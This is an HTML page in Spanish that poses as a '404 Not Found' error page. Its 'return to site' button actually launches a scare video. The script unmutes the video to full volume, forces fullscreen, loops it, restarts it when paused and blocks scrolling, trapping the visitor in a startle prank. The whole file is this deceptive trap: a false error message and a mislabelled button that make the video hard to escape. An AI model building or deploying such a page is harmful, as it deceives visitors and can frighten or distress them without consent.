<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>404 Not Found</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
                   Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }
    html, body {
      height: 100%;
      overflow: hidden;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #333;
      flex-direction: column;
      text-align: center;
    }
    h1 {
      font-size: 72px;
      margin-bottom: 0;
    }
    p {
      font-size: 20px;
      margin-top: 0;
    }
    button {
      margin-top: 20px;
      background-color: #00ad9f;
      color: white;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    video {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: 9999;
      display: none;
    }
  </style>
</head>
<body>

  <div id="error-screen">
    <h1>404</h1>
    <p>La p√°gina que buscas no existe.</p>
    <button id="returnBtn">Regresar al sitio</button>
  </div>

  <video id="scareVideo" preload="auto">
    <source src="no.mp4" type="video/mp4" />
    Tu navegador no soporta video.
  </video>

  <script>
    const btn = document.getElementById('returnBtn');
    const video = document.getElementById('scareVideo');
    const errorScreen = document.getElementById('error-screen');

    // Prevenir scroll
    document.body.addEventListener('touchmove', function(e) {
      e.preventDefault();
    }, { passive: false });

    btn.addEventListener('click', async () => {
      try {
        // Oculta pantalla falsa 404
        errorScreen.style.display = 'none';

        // Mostrar video y reproducir
        video.style.display = 'block';
        video.muted = false;
        video.volume = 1.0;
        await video.play();

        // Forzar pantalla completa
        if (video.requestFullscreen) {
          await video.requestFullscreen();
        } else if (video.webkitEnterFullscreen) {
          video.webkitEnterFullscreen(); // iOS
        }

        // Repetir manualmente si no hace loop perfecto
        video.addEventListener('ended', () => {
          video.currentTime = 0;
          video.play();
        });

      } catch (e) {
        // En caso de fallo, intentar reproducir sin pantalla completa
        video.style.display = 'block';
        video.play();
      }
    });

    // Reanudar si se pausa por error del navegador
    video.addEventListener('pause', () => {
      video.play().catch(() => {});
    });
  </script>

</body>
</html>
